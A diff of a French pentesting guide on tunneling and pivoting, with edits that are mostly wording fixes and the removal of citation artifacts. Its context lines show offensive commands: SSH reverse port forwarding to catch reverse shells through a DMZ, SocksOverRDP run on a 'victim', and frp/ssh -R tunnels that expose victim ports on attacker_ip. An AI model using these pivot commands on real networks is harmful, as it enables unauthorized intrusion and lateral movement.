@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### Reverse Port Forwarding
 
-Ceci est utile pour obtenir des shells inversés à partir d'hôtes internes via une DMZ vers votre hôte :
+Ceci est utile pour obtenir des shells inversés à partir d'hôtes internes à travers une DMZ vers votre hôte :
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Sécurité – Attaque Terrapin (CVE-2023-48795)**
-> L'attaque de rétrogradation Terrapin de 2023 peut permettre à un homme du milieu de manipuler la première poignée de main SSH et d'injecter des données dans **n'importe quel canal transféré** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont corrigés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de compter sur les tunnels SSH. citeturn4search0
+> L'attaque de rétrogradation Terrapin de 2023 peut permettre à un homme du milieu de manipuler la première poignée de main SSH et d'injecter des données dans **n'importe quel canal transféré** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont corrigés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de compter sur les tunnels SSH.
 
 ## SSHUTTLE
 
@@ -350,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Vous devez avoir **un accès RDP sur le système**.\
 Téléchargez :
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité de Service de Bureau à Distance de Windows. DVC est responsable de **l'acheminement des paquets sur la connexion RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité Remote Desktop Service de Windows. DVC est responsable de **tunneling des paquets sur la connexion RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
@@ -358,7 +358,7 @@ Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Maintenant, nous pouvons **connecter** au **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** indiquant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
+Maintenant, nous pouvons **connecter** à la **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** indiquant que le **plugin SocksOverRDP est activé**, et qu'il va **écouter** sur **127.0.0.1:1080**.
 
 **Connectez-vous** via **RDP** et téléchargez & exécutez sur la machine de la victime le binaire `SocksOverRDP-Server.exe` :
 ```
@@ -484,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **est un outil pour exposer des solutions à Internet en une ligne de commande.**\
-_Les URI d'exposition sont comme :_ **UID.ngrok.io**
+_Exposition URI sont comme:_ **UID.ngrok.io**
 
 ### Installation
 
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Le démon `cloudflared` de Cloudflare peut créer des tunnels sortants qui exposent **des services TCP/UDP locaux** sans nécessiter de règles de pare-feu entrantes, en utilisant l'edge de Cloudflare comme point de rendez-vous. Cela est très pratique lorsque le pare-feu de sortie n'autorise que le trafic HTTPS mais que les connexions entrantes sont bloquées.
+Le démon `cloudflared` de Cloudflare peut créer des tunnels sortants qui exposent **des services TCP/UDP locaux** sans nécessiter de règles de pare-feu entrantes, en utilisant l'edge de Cloudflare comme point de rendez-vous. C'est très pratique lorsque le pare-feu de sortie n'autorise que le trafic HTTPS mais que les connexions entrantes sont bloquées.
 
 ### Quick tunnel one-liner
 ```bash
@@ -574,11 +574,11 @@ Démarrez le connecteur :
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Parce que tout le trafic quitte l'hôte **sortant sur 443**, les tunnels Cloudflared sont un moyen simple de contourner les ACL d'entrée ou les limites NAT. Soyez conscient que le binaire s'exécute généralement avec des privilèges élevés – utilisez des conteneurs ou le drapeau `--user` lorsque cela est possible. citeturn1search0
+Parce que tout le trafic quitte l'hôte **sortant sur 443**, les tunnels Cloudflared sont un moyen simple de contourner les ACL d'entrée ou les limites NAT. Soyez conscient que le binaire s'exécute généralement avec des privilèges élevés – utilisez des conteneurs ou le drapeau `--user` lorsque cela est possible.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) est un reverse-proxy Go activement maintenu qui prend en charge **TCP, UDP, HTTP/S, SOCKS et le P2P NAT-hole-punching**. À partir de **v0.53.0 (mai 2024)**, il peut agir comme une **passerelle de tunnel SSH**, permettant à un hôte cible de créer un tunnel inverse en utilisant uniquement le client OpenSSH standard – aucun binaire supplémentaire requis.
+[`frp`](https://github.com/fatedier/frp) est un reverse-proxy Go activement maintenu qui prend en charge **TCP, UDP, HTTP/S, SOCKS et P2P NAT-hole-punching**. À partir de **v0.53.0 (mai 2024)**, il peut agir comme un **SSH Tunnel Gateway**, permettant à un hôte cible de créer un tunnel inverse en utilisant uniquement le client OpenSSH standard – aucun binaire supplémentaire requis.
 
 ### Tunnel TCP inverse classique
 ```bash
@@ -608,7 +608,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-La commande ci-dessus publie le port de la victime **8080** en tant que **attacker_ip:9000** sans déployer d'outils supplémentaires – idéal pour le pivotement en vivant sur le terrain. citeturn2search1
+La commande ci-dessus publie le port de la victime **8080** en tant que **attacker_ip:9000** sans déployer d'outils supplémentaires – idéal pour le pivotement en vivant des ressources disponibles.
 
 ## Autres outils à vérifier
 
